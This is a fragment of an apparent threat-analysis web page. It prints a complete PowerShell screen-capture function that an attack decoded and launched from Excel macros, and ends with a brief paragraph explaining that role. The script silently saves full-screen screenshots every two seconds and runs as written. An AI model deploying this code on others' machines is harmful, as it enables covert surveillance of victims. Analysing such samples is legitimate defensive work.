			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function Get-TimedScreenshot
{
    [CmdletBinding()] Param(
        [Parameter(Mandatory=$True)]
        [ValidateScript({Test-Path -Path $_ })]
        [String] $Path,

        [Parameter(Mandatory=$True)]
        [Int32] $Interval,

        [Parameter(Mandatory=$True)]
        [String] $EndTime
    )

    Function Get-Screenshot {
       $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
       $ScreenshotObject = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height
       $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
       $DrawingGraphics.CopyFromScreen( $ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size)
       $DrawingGraphics.Dispose()
       $ScreenshotObject.Save($FilePath)
       $ScreenshotObject.Dispose()
    }

    Try {

        #load required assembly
        Add-Type -Assembly System.Windows.Forms

        Do {
            #get the current time and build the filename from it
            $Time = (Get-Date)

            [String] $FileName = "$($Time.Month)"
            $FileName += '-'
            $FileName += "$($Time.Day)"
            $FileName += '-'
            $FileName += "$($Time.Year)"
            $FileName += '-'
            $FileName += "$($Time.Hour)"
            $FileName += '-'
            $FileName += "$($Time.Minute)"
            $FileName += '-'
            $FileName += "$($Time.Second)"
            $FileName += '.png'

            [String] $FilePath = (Join-Path $Path $FileName)
            Get-Screenshot

            Start-Sleep -Seconds $Interval
        }

        While ((Get-Date -Format HH:mm) -lt $EndTime)
    }

    Catch {Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage}
}

Get-TimedScreenshot -Path "$env:userprofile\Desktop" -Interval 2 -EndTime 24:00</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-4">4</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-6">6</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-8">8</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-10">10</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-12">12</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-14">14</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-16">16</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-18">18</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-20">20</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-22">22</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-24">24</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-26">26</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-28">28</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-30">30</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-32">32</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-34">34</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-36">36</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-38">38</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-40">40</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-42">42</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-44">44</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-46">46</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-48">48</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-50">50</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-52">52</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-54">54</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-56">56</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9a2903474191-58">58</div><div class="crayon-num" data-line="crayon-60a9b96a2c9a2903474191-59">59</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-1"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">Get</span><span class="crayon-o">-</span><span class="crayon-e">TimedScreenshot</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-2"><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">CmdletBinding</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-e">Param</span><span class="crayon-sy">(</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">Parameter</span><span class="crayon-sy">(</span><span class="crayon-v">Mandatory</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-t">True</span><span class="crayon-sy">)</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">ValidateScript</span><span class="crayon-sy">(</span><span class="crayon-sy">{</span><span class="crayon-v">Test</span><span class="crayon-o">-</span><span class="crayon-v">Path</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Path</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">_</span><span class="crayon-h"> </span><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-t">String</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">Path</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">Parameter</span><span class="crayon-sy">(</span><span class="crayon-v">Mandatory</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-t">True</span><span class="crayon-sy">)</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-v">Int32</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">Interval</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-10">&nbsp;</div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">Parameter</span><span class="crayon-sy">(</span><span class="crayon-v">Mandatory</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-t">True</span><span class="crayon-sy">)</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-t">String</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">EndTime</span></div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-14">&nbsp;</div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">Function</span><span class="crayon-h"> </span><span class="crayon-e">Get</span><span class="crayon-o">-</span><span class="crayon-e">Screenshot</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">$</span><span class="crayon-v">ScreenBounds</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">Windows</span><span class="crayon-sy">.</span><span class="crayon-v">Forms</span><span class="crayon-sy">.</span><span class="crayon-v">SystemInformation</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-i">VirtualScreen</span></div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">$</span><span class="crayon-v">ScreenshotObject</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">Drawing</span><span class="crayon-sy">.</span><span class="crayon-i">Bitmap</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ScreenBounds</span><span class="crayon-sy">.</span><span class="crayon-v">Width</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ScreenBounds</span><span class="crayon-sy">.</span><span class="crayon-i">Height</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">$</span><span class="crayon-v">DrawingGraphics</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">Drawing</span><span class="crayon-sy">.</span><span class="crayon-v">Graphics</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">FromImage</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ScreenshotObject</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">$</span><span class="crayon-v">DrawingGraphics</span><span class="crayon-sy">.</span><span class="crayon-e">CopyFromScreen</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ScreenBounds</span><span class="crayon-sy">.</span><span class="crayon-v">Location</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">Drawing</span><span class="crayon-sy">.</span><span class="crayon-v">Point</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">Empty</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ScreenBounds</span><span class="crayon-sy">.</span><span class="crayon-v">Size</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">$</span><span class="crayon-v">DrawingGraphics</span><span class="crayon-sy">.</span><span class="crayon-e">Dispose</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">$</span><span class="crayon-v">ScreenshotObject</span><span class="crayon-sy">.</span><span class="crayon-e">Save</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">FilePath</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">$</span><span class="crayon-v">ScreenshotObject</span><span class="crayon-sy">.</span><span class="crayon-e">Dispose</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-24">&nbsp;</div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">Try</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-26">&nbsp;</div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-p">#load required assembly</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Add</span><span class="crayon-o">-</span><span class="crayon-v">Type</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">Assembly </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Windows</span><span class="crayon-sy">.</span><span class="crayon-e">Forms</span></div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-29">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-30"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">Do</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-p">#get the current time and build the filename from it</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">Time</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-v">Date</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-33">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-t">String</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">FileName</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"$($Time.Month)"</span></div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">FileName</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'-'</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">FileName</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">"$($Time.Day)"</span></div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">FileName</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'-'</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">FileName</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">"$($Time.Year)"</span></div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">FileName</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'-'</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">FileName</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">"$($Time.Hour)"</span></div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">FileName</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'-'</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">FileName</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">"$($Time.Minute)"</span></div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">FileName</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'-'</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-44"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">FileName</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">"$($Time.Second)"</span></div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-45"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">FileName</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-s">'.png'</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-46">&nbsp;</div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-47"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-t">String</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">FilePath</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">Join</span><span class="crayon-o">-</span><span class="crayon-i">Path</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">Path</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">FileName</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-48"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-e">Screenshot</span></div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-49">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-50"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Start</span><span class="crayon-o">-</span><span class="crayon-v">Sleep</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Seconds</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">Interval</span></div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-51"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-52">&nbsp;</div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-53"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">While</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-v">Date</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">Format </span><span class="crayon-v">HH</span><span class="crayon-o">:</span><span class="crayon-v">mm</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">lt</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">EndTime</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-54"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-55">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-56"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">Catch</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-v">Write</span><span class="crayon-o">-</span><span class="crayon-i">Error</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">Error</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-e">ToString</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">Error</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-v">InvocationInfo</span><span class="crayon-sy">.</span><span class="crayon-v">PositionMessage</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-57"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9a2903474191-58">&nbsp;</div><div class="crayon-line" id="crayon-60a9b96a2c9a2903474191-59"><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-v">TimedScreenshot</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Path</span><span class="crayon-h"> </span><span class="crayon-s">"$env:userprofile\Desktop"</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Interval</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">EndTime</span><span class="crayon-h"> </span><span class="crayon-cn">24</span><span class="crayon-o">:</span><span class="crayon-cn">00</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0027 seconds] -->
<p>For these types of attacks, the PowerShell code is just an augmentation to the overarching suite of tools being used in the attack, likely intended to save the attacker time in developing the desired functionality. In this case, Microsoft Excel documents contained macros that first launch a function to decode the PowerShell code and begin taking screenshots while a second function is called afterwards to decode a PE file that handles the rest of the attack.</p>
